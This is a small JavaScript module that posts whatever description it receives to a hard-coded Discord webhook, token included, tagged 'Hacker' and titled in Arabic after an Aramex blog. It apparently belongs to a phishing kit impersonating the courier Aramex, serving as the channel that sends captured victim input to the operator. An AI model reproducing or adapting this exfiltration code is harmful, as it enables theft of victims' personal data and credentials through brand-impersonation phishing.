import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321463816780906508/KPURddQ33zSNYqbqykWSDmCEygxEIO-GfQwo62757-aBIldHzCjcH5CHwwmbR_CrIKmD",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
